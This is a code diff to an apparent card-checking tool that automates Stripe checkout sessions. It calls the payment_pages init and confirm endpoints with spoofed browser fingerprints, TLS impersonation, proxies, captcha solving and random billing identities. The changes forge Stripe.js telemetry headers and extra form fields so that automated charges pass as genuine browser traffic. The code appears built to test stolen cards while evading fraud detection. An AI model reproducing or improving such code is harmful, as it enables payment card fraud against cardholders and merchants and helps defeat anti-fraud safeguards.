@@ -15,6 +15,7 @@ from utils.constants import (
 from utils.stripe import (
     get_stripe_headers, generate_stripe_fingerprints,
     generate_eid, get_stripe_cookies, get_random_stripe_js_agent,
+    get_stripe_telemetry_header, record_stripe_request,
 )
 from utils.proxy import get_proxy_url
 from utils.captcha import solve_hcaptcha
@@ -73,6 +74,12 @@ async def decode_pk_from_url(url: str) -> dict:
         cs_match = re.search(r'cs_(live|test)_[A-Za-z0-9]+', url)
         if cs_match:
             result["cs"] = cs_match.group(0)
+
+        # Payment Page URLs use ppage_ instead of cs_
+        if not result["cs"]:
+            pp_match = re.search(r'ppage_[A-Za-z0-9]+', url)
+            if pp_match:
+                result["cs"] = pp_match.group(0)
 
         # Method 1: Decode from hash fragment (XOR decode)
         if '#' in url:
@@ -155,20 +162,34 @@ async def get_checkout_info(url: str, tls_profile: str = None, user_agent: str =
             result["eid"] = eid  # Save for reuse in confirm
             body = f"key={result['pk']}&eid={eid}&browser_locale=en-US&redirect_type=url"
 
-            headers = get_stripe_headers()
-            if user_agent:
-                headers["user-agent"] = user_agent
+            headers = get_stripe_headers(user_agent=user_agent)
             if cookies_str:
                 headers["cookie"] = cookies_str
+            # X-Stripe-Telemetry — real Stripe.js sends this after first request
+            telemetry = get_stripe_telemetry_header()
+            if telemetry:
+                headers["x-stripe-telemetry"] = telemetry
 
+            # Normalize proxy: accept both raw (host:port:user:pass) and URL format
+            proxy_url = get_proxy_url(proxy) if proxy and '://' not in proxy else proxy
             async with CurlSession(impersonate=init_tls) as s:
+                _init_start = time.perf_counter()
                 r = await s.post(
                     f"https://api.stripe.com/v1/payment_pages/{result['cs']}/init",
                     headers=headers,
                     data=body,
-                    proxy=proxy,
+                    proxy=proxy_url,
                     timeout=20
                 )
+                # Record metrics for telemetry header on next request
+                _init_dur = int((time.perf_counter() - _init_start) * 1000)
+                _req_id = ""
+                try:
+                    _req_id = r.headers.get("Request-Id", "") or r.headers.get("request-id", "")
+                except Exception:
+                    pass
+                if _req_id:
+                    record_stripe_request(_req_id, _init_dur)
                 init_data = r.json()
 
             if "error" not in init_data:
@@ -315,22 +336,34 @@ async def charge_card(card: dict, checkout_data: dict, proxy_str: str = None, us
                 cust = init_data.get("customer") or {}
                 addr = cust.get("address") or {}
 
-                # Use customer data if available, otherwise random billing
+                # Detect country: customer address → merchant country → fallback MO (Macau)
+                detected_country = (
+                    addr.get("country")
+                    or checkout_data.get("country")
+                    or init_data.get("account_settings", {}).get("country")
+                    or "MO"
+                )
+
+                # Use customer data if available, otherwise random billing matched to country
+                # Always get a country-matched fallback for missing fields
+                fallback = get_random_billing(detected_country)
+                
                 if cust.get("name") or addr.get("line1"):
-                    name = cust.get("name") or "John Smith"
-                    country = addr.get("country") or "US"
-                    line1 = addr.get("line1") or "742 Evergreen Terrace"
-                    city = addr.get("city") or "Springfield"
-                    state = addr.get("state") or "IL"
-                    zip_code = addr.get("postal_code") or "62704"
+                    name = cust.get("name") or fallback["name"]
+                    country = addr.get("country") or detected_country
+                    line1 = addr.get("line1") or fallback["line1"]
+                    city = addr.get("city") or fallback["city"]
+                    state = addr.get("state") or fallback["state"]
+                    zip_code = addr.get("postal_code") or fallback["zip"]
                 else:
-                    billing = get_random_billing()
-                    name = billing["name"]
-                    country = billing["country"]
-                    line1 = billing["line1"]
-                    city = billing["city"]
-                    state = billing["state"]
-                    zip_code = billing["zip"]
+                    name = fallback["name"]
+                    country = fallback["country"]
+                    line1 = fallback["line1"]
+                    city = fallback["city"]
+                    state = fallback["state"]
+                    zip_code = fallback["zip"]
+                
+                print(f"[DEBUG] Billing: country={country}, name={name}, city={city}")
 
                 if attempt > 0:
                     print(f"[DEBUG] Retry attempt {attempt}...")
@@ -375,6 +408,11 @@ async def charge_card(card: dict, checkout_data: dict, proxy_str: str = None, us
                 # Add pasted_fields only if not empty
                 if pasted:
                     conf_body += f"&payment_method_data[pasted_fields]={pasted}"
+                # allow_redisplay — modern Stripe.js always sends this
+                allow_redisplay = "unspecified"
+                if session_ctx and session_ctx.get("allow_redisplay"):
+                    allow_redisplay = session_ctx["allow_redisplay"]
+                conf_body += f"&payment_method_data[allow_redisplay]={allow_redisplay}"
                 # Add referrer — real Stripe.js always sends this
                 checkout_url = checkout_data.get("url", "https://checkout.stripe.com")
                 conf_body += f"&payment_method_data[referrer]={checkout_url}"
@@ -391,13 +429,17 @@ async def charge_card(card: dict, checkout_data: dict, proxy_str: str = None, us
                     f"&_stripe_version={checkout_data.get('api_version', '2025-02-24.acacia')}"
                 )
 
-                # Use curl_cffi headers + matched UA + cookies
-                headers = get_stripe_headers()
-                if session_ctx and session_ctx.get("user_agent"):
-                    headers["user-agent"] = session_ctx["user_agent"]
+                # Use curl_cffi headers + matched UA + sec-ch-ua + cookies
+                ua = session_ctx.get("user_agent") if session_ctx else None
+                headers = get_stripe_headers(user_agent=ua)
                 if session_ctx and session_ctx.get("cookies"):
                     headers["cookie"] = session_ctx["cookies"]
+                # X-Stripe-Telemetry — must be present on confirm (2nd+ request)
+                telemetry = get_stripe_telemetry_header()
+                if telemetry:
+                    headers["x-stripe-telemetry"] = telemetry
 
+                _conf_start = time.perf_counter()
                 r = await s.post(
                     f"https://api.stripe.com/v1/payment_pages/{cs}/confirm",
                     headers=headers,
@@ -405,6 +447,14 @@ async def charge_card(card: dict, checkout_data: dict, proxy_str: str = None, us
                     proxy=proxy_url,
                     timeout=25
                 )
+                # Record for next telemetry
+                _conf_dur = int((time.perf_counter() - _conf_start) * 1000)
+                try:
+                    _conf_req_id = r.headers.get("Request-Id", "") or r.headers.get("request-id", "")
+                    if _conf_req_id:
+                        record_stripe_request(_conf_req_id, _conf_dur)
+                except Exception:
+                    pass
                 conf = r.json()
 
                 print(f"[DEBUG] Confirm Response: {str(conf)[:200]}...")
@@ -475,7 +525,6 @@ async def charge_card(card: dict, checkout_data: dict, proxy_str: str = None, us
                                     site_key=site_key,
                                     url=checkout_url,
                                     rqdata=rqdata or None,
-                                    proxy=captcha_proxy,
                                     user_agent=captcha_ua,
                                 )
                                 
